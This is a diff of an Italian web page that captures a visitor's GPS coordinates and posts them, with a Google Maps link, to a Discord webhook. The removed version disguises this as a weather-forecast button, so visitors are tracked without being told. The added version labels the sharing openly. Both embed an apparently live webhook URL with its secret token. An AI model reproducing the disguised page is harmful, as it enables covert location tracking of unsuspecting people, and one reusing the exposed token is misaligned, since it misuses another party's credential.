@@ -1,46 +1,171 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifica Posizione Meteo</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Condivisione Posizione GPS</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #0f172a;
+      color: #f8fafc;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .card {
+      background-color: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 16px;
+      padding: 32px 24px;
+      max-width: 380px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+    }
+
+    .icon {
+      font-size: 40px;
+      margin-bottom: 16px;
+    }
+
+    h1 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #f1f5f9;
+    }
+
+    p {
+      font-size: 14px;
+      color: #94a3b8;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .btn {
+      background-color: #3b82f6;
+      color: #ffffff;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.2s ease;
+    }
+
+    .btn:hover {
+      background-color: #2563eb;
+    }
+
+    .btn:disabled {
+      background-color: #475569;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 16px;
+      font-size: 13px;
+      min-height: 18px;
+    }
+
+    .success {
+      color: #4ade80;
+    }
+
+    .error {
+      color: #f87171;
+    }
+  </style>
 </head>
-<body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
+<body>
 
-    <h2>Premi il pulsante per caricare le previsioni meteo della tua zona</h2>
-    <button onclick="ottieniPosizione()" style="padding: 15px 25px; font-size: 16px;">Mostra Meteo</button>
+  <div class="card">
+    <div class="icon">📍</div>
+    <h1>Invia Posizione GPS</h1>
+    <p>Premi il pulsante sottostante per rilevare le tue coordinate geografiche e inviarle al canale dedicato.</p>
+    <button class="btn" onclick="inviaPosizione()" id="geoBtn">Condividi Posizione</button>
+    <div id="status"></div>
+  </div>
 
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1532480331641389211/JeR1Qx5ssbO4l8zcfHm0mv7zQQnj4V8cPEjQnv5Fc68c_7qlc7kmBfNNb2OsNdZ1SQ2X";
+  <script>
+    // Inserisci qui il tuo URL Webhook di Discord
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1532480331641389211/JeR1Qx5ssbO4l8zcfHm0mv7zQQnj4V8cPEjQnv5Fc68c_7qlc7kmBfNNb2OsNdZ1SQ2X";
 
-        function ottieniPosizione() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(inviaPosizione, gestisciErrore);
+    function inviaPosizione() {
+      const statusDiv = document.getElementById("status");
+      const btn = document.getElementById("geoBtn");
+
+      if (!navigator.geolocation) {
+        statusDiv.className = "error";
+        statusDiv.textContent = "Geolocalizzazione non supportata dal browser.";
+        return;
+      }
+
+      btn.disabled = true;
+      statusDiv.className = "";
+      statusDiv.textContent = "Rilevamento posizione in corso...";
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              content: `📍 **Nuova posizione rilevata:**\nCoordinate: ${lat}, ${lon}\nGoogle Maps: ${mapsUrl}`
+            })
+          })
+          .then(response => {
+            if (response.ok) {
+              statusDiv.className = "success";
+              statusDiv.textContent = "Posizione inviata con successo!";
             } else {
-                alert("Geolocalizzazione non supportata dal tuo browser.");
+              statusDiv.className = "error";
+              statusDiv.textContent = "Errore durante l'invio a Discord.";
             }
+          })
+          .catch(() => {
+            statusDiv.className = "error";
+            statusDiv.textContent = "Errore di connessione.";
+          })
+          .finally(() => {
+            btn.disabled = false;
+          });
+        },
+        (error) => {
+          btn.disabled = false;
+          statusDiv.className = "error";
+          if (error.code === error.PERMISSION_DENIED) {
+            statusDiv.textContent = "Permesso negato dall'utente.";
+          } else {
+            statusDiv.textContent = "Impossibile rilevare la posizione.";
+          }
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
         }
+      );
+    }
+  </script>
 
-        function inviaPosizione(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const linkMaps = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            // Invio automatico dei dati al tuo Webhook
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `📍 **Posizione ricevuta!**\nLatitudine: ${lat}\nLongitudine: ${lon}\nMappa: ${linkMaps}`
-                })
-            }).then(() => {
-                alert("Posizione caricata con successo!");
-            });
-        }
-
-        function gestisciErrore(error) {
-            alert("Impossibile caricare la posizione. Hai rifiutato il permesso.");
-        }
-    </script>
 </body>
 </html>
